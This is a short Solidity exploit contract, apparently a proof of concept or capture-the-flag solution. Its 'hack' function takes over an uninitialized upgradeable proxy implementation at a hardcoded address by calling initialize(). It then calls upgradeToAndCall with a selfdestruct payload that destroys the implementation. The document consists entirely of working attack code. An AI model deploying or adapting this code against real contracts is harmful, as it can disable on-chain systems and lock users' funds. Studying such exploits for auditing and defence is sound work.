// SPDX-License-Identifier: MIT
pragma solidity ^0.8.28;

interface Poc {
    function initialize() external;
    function upgradeToAndCall(address newImplementation, bytes memory data) external payable;
    
}

contract Test {
    Poc engine;
    Poc engine_2;
    constructor() {
        engine = Poc(0x592b5F3b05452610012FA91b28c7e055B5F71C6a);
        engine_2 = Poc(0x83E58fa1Ad1A06bAa4184C8a50774304E830E67a);
    }
    function hack() external {
        engine.initialize(); 
        engine.upgradeToAndCall(address(this), abi.encodeWithSelector(this.destruct.selector));
    }

    function destruct() external {
        selfdestruct(payable(msg.sender)); 
    }
}